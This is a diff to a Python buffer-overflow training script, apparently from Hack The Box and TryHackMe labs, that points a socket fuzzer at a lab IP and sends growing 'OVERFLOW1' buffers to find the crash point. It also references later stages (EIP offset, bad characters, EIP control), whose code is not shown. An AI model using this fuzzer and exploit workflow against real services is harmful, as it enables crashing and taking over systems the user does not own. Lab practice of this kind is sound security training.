@@ -1,22 +1,30 @@
 #!/usr/bin/python3
-# Extracted from academy.hackthebox.eu
-import socket
+# Extracted from academy.hackthebox.eu and part from tryhackme
+import socket, time, sys
 from struct import pack
 
-host = "127.0.0.1"
-port = 8888
+host = "10.10.211.109"
+port = 1337
+timeout = 5
 
 def fuzz():
     try:
-        for i in range(0,10000,500):
-            buffer = b"A"*i
+        for i in range(0,10000,100):
+            command = "OVERFLOW1 "
+            buffer = "A"*i
             print("Fuzzing %s bytes" % i)
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            print("Connecting to server %s port %s" % (host, port))
             s.connect((host, port))
-            s.send(buffer)
+            print("Sending the buffer ")
+            s.send(bytes((command+buffer), "latin-1"))
+            print("Closing connection... ")
+            s.recv(1024)
             s.close()
+            time.sleep(1)
     except:
-        print("Could not establish a connection")
+        print("Fuzzing crashed at {} bytes".format(len(buffer)))
+        sys.exit(0)
 
 def eip_offset():
     # In x64dbg command: ERC --pattern c 2000
@@ -90,4 +98,4 @@ def bad_chars():
 #bad_chars()
 #eip_control()
 #eip_offset()
-#fuzz()        
+fuzz()        
